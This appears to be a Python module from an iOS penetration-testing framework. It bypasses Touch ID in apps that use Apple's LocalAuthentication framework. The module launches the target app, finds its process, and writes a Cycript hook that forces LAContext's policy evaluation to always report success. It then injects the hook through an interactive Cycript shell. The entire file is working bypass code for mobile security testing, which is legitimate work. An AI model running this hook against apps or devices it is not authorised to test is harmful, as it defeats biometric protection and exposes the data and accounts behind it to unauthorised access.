from core.framework.module import BaseModule


class Module(BaseModule):
    meta = {
        'name': 'Cycript Touch ID',
        'author': 'Ioannis Stais (ioannis.stais@gmail.com)',
        'description': 'Circumvent Touch ID when implemented using LocalAuthentication framework',
        'options': (
        ),
    }

    # ==================================================================================================================
    # RUN
    # ==================================================================================================================
    def module_run(self):
        # Launch the app
        self.printer.info("Launching the app...")
        self.device.app.open(self.APP_METADATA['bundle_id'])
        # Search for PID
        pid = self.device.app.search_pid(self.APP_METADATA['binary_name'])

        # Prepare hook
        fname = "hook.cy"
        hook = "@import com.saurik.substrate.MS; var oldm = {}; MS.hookMessage(LAContext, @selector(evaluatePolicy:localizedReason:reply:), function(self, reason, block) { block(YES, nil); }, oldm);"
        dst = self.device.remote_op.build_temp_path_for_file(fname)
        self.device.remote_op.write_file(dst, hook)

        # Launch Cycript shell
        self.printer.info("Spawning a Cycript shell...")
        cmd = "{bin} -p {app} {dst}".format(bin=self.device.DEVICE_TOOLS['CYCRIPT'], app=pid,dst=dst)
        self.device.remote_op.command_interactive_tty(cmd)
